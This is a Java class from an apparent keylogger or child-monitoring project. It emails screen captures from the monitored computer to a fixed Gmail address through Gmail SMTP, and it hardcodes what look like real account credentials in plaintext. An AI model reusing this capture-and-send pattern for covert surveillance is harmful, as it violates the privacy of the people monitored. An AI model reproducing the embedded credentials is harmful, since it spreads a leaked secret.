package core;

import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
 
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
 
public class SendEmail {
 
	private Properties properties;
	private static SendEmail instance;
	private SendEmail() {
		setProperties();
		// TODO Auto-generated constructor stub
	}
	public static SendEmail getSendEmail() {
		if(instance == null) instance = new SendEmail();
		return instance;
	}
	private void setProperties() {
		properties = new Properties();
        properties.put("mail.smtp.host", "smtp.gmail.com");
        properties.put("mail.smtp.port", 587);
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.user", "childrenmanage265@gmail.com");
        properties.put("mail.password", "01694429810man");
	}
    public void send(String imagePathString) throws AddressException, MessagingException {
    	
		Map<String, String> inlineImages = new HashMap<String, String>();
        inlineImages.put("image", imagePathString);
        // creates a new session with an authenticator
        Authenticator auth = new Authenticator() {
            public PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(properties.getProperty("mail.user"), properties.getProperty("mail.password"));
            }
        };
        Session session = Session.getInstance(properties, auth);
 
        // creates a new e-mail message
        Message msg = new MimeMessage(session);
 
        msg.setFrom(new InternetAddress(properties.getProperty("mail.user")));
        InternetAddress[] toAddresses = { new InternetAddress("manmaihuu@gmail.com") };
        msg.setRecipients(Message.RecipientType.TO, toAddresses);
        msg.setSubject("Children warning");
        msg.setSentDate(new Date());
        
 
        MimeBodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setContent("Some suspected activites recorded from your children's computer", "text/html");
 
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messageBodyPart);
 
        if (inlineImages != null && inlineImages.size() > 0) {
            Set<String> setImageID = inlineImages.keySet();
             
            for (String contentId : setImageID) {
                MimeBodyPart imagePart = new MimeBodyPart();
                imagePart.setHeader("Content-ID", "<" + contentId + ">");
                imagePart.setDisposition(MimeBodyPart.INLINE);
                 
                String imageFilePath = inlineImages.get(contentId);
                try {
                    imagePart.attachFile(imageFilePath);
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
 
                multipart.addBodyPart(imagePart);
            }
        }
 
        msg.setContent(multipart);
 
        Transport.send(msg);
    }
    
    public static void main(String[] args) {
		SendEmail senderEmail = SendEmail.getSendEmail();
//		Map<String, String> inlineImages = new HashMap<String, String>();
//        inlineImages.put("image1", "D:/Workspace/Java/key-logger/screen-capture.png");
        try {
        	senderEmail.send("D:/Workspace/Java/key-logger/screen-capture.png");
            System.out.println("Email sent.");
        } catch (Exception ex) {
            System.out.println("Could not send email.");
            ex.printStackTrace();
        }
	}
}
